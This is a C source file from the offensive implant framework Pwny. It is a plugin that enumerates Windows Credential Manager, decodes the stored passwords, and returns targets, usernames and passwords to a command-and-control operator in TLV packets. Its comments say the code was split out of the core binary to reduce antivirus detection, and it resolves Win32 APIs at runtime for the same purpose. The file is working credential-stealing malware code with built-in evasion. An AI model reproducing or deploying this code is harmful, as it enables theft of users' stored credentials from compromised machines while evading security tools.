/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Credential Store tab plugin — enumerate Windows Credential Manager.
 *
 * Moved out of the core to remove CredEnumerateW / CredFree from
 * the main binary's IAT, reducing AV detection surface.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>
#include <wincred.h>

/* tab_cot.h MUST come after the real Pwny headers */
#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Win32 function pointer types — resolved at init via cot_resolve()   */
/* ------------------------------------------------------------------ */

typedef int   (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWCH, int,
                                               LPSTR, int, LPCCH, LPBOOL);
typedef BOOL  (WINAPI *fn_CredEnumerateW)(LPCWSTR, DWORD, DWORD *,
                                          PCREDENTIALW **);
typedef void  (WINAPI *fn_CredFree)(PVOID);
typedef DWORD (WINAPI *fn_GetLastError)(void);

static struct
{
    fn_WideCharToMultiByte pWideCharToMultiByte;
    fn_CredEnumerateW     pCredEnumerateW;
    fn_CredFree           pCredFree;
    fn_GetLastError       pGetLastError;
} w;


#define CREDSTORE_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define TLV_TYPE_CRED_TARGET   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define TLV_TYPE_CRED_USER     TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define TLV_TYPE_CRED_PASS     TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
#define TLV_TYPE_CRED_COMMENT  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 3)
#define TLV_TYPE_CRED_TYPE     TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)
#define TLV_TYPE_CRED_GROUP    TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, TAB_BASE, API_TYPE)

static char *wchar_to_utf8(const wchar_t *in)
{
    char *out;
    int len;

    if (in == NULL)
    {
        return NULL;
    }

    len = w.pWideCharToMultiByte(CP_UTF8, 0, in, -1, NULL, 0, NULL, NULL);
    if (len <= 0)
    {
        return NULL;
    }

    out = calloc(len, sizeof(char));
    if (out == NULL)
    {
        return NULL;
    }

    if (w.pWideCharToMultiByte(CP_UTF8, 0, in, -1, out, len, NULL, FALSE) == 0)
    {
        free(out);
        out = NULL;
    }

    return out;
}

static tlv_pkt_t *credstore_list(c2_t *c2)
{
    PCREDENTIALW *creds;
    DWORD count;
    DWORD i;
    tlv_pkt_t *result;

    if (!w.pCredEnumerateW(NULL, 0, &count, &creds))
    {
        log_debug("* CredEnumerate failed (%lu)\n", w.pGetLastError());
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (i = 0; i < count; i++)
    {
        PCREDENTIALW cred = creds[i];
        tlv_pkt_t *entry;
        char *utf8;

        entry = tlv_pkt_create();

        if (cred->TargetName)
        {
            utf8 = wchar_to_utf8(cred->TargetName);
            if (utf8) { tlv_pkt_add_string(entry, TLV_TYPE_CRED_TARGET, utf8); free(utf8); }
        }

        if (cred->UserName)
        {
            utf8 = wchar_to_utf8(cred->UserName);
            if (utf8) { tlv_pkt_add_string(entry, TLV_TYPE_CRED_USER, utf8); free(utf8); }
        }

        if (cred->Comment)
        {
            utf8 = wchar_to_utf8(cred->Comment);
            if (utf8) { tlv_pkt_add_string(entry, TLV_TYPE_CRED_COMMENT, utf8); free(utf8); }
        }

        tlv_pkt_add_u32(entry, TLV_TYPE_CRED_TYPE, (int32_t)cred->Type);

        if (cred->CredentialBlobSize > 0 && cred->CredentialBlob != NULL)
        {
            if (cred->CredentialBlobSize >= 2 &&
                cred->CredentialBlobSize % 2 == 0)
            {
                DWORD wchars = cred->CredentialBlobSize / sizeof(WCHAR);
                WCHAR *blob_copy = (WCHAR *)calloc(wchars + 1, sizeof(WCHAR));

                if (blob_copy != NULL)
                {
                    memcpy(blob_copy, cred->CredentialBlob, cred->CredentialBlobSize);
                    blob_copy[wchars] = L'\0';

                    utf8 = wchar_to_utf8(blob_copy);
                    free(blob_copy);

                    if (utf8)
                    {
                        tlv_pkt_add_string(entry, TLV_TYPE_CRED_PASS, utf8);
                        free(utf8);
                    }
                    else
                    {
                        tlv_pkt_add_bytes(entry, TLV_TYPE_CRED_PASS,
                                          cred->CredentialBlob,
                                          cred->CredentialBlobSize);
                    }
                }
                else
                {
                    tlv_pkt_add_bytes(entry, TLV_TYPE_CRED_PASS,
                                      cred->CredentialBlob,
                                      cred->CredentialBlobSize);
                }
            }
            else
            {
                tlv_pkt_add_bytes(entry, TLV_TYPE_CRED_PASS,
                                  cred->CredentialBlob,
                                  cred->CredentialBlobSize);
            }
        }

        tlv_pkt_add_tlv(result, TLV_TYPE_CRED_GROUP, entry);
        tlv_pkt_destroy(entry);
    }

    w.pCredFree(creds);

    return result;
}

COT_ENTRY
{
    /* Resolve Win32 APIs once at load time */
    w.pWideCharToMultiByte = (fn_WideCharToMultiByte)cot_resolve("kernel32.dll",
                                                                 "WideCharToMultiByte");
    w.pCredEnumerateW     = (fn_CredEnumerateW)cot_resolve("advapi32.dll",
                                                            "CredEnumerateW");
    w.pCredFree           = (fn_CredFree)cot_resolve("advapi32.dll",
                                                      "CredFree");
    w.pGetLastError       = (fn_GetLastError)cot_resolve("kernel32.dll",
                                                          "GetLastError");

    /* Register handlers */
    api_call_register(api_calls, CREDSTORE_LIST, credstore_list);
}

#endif
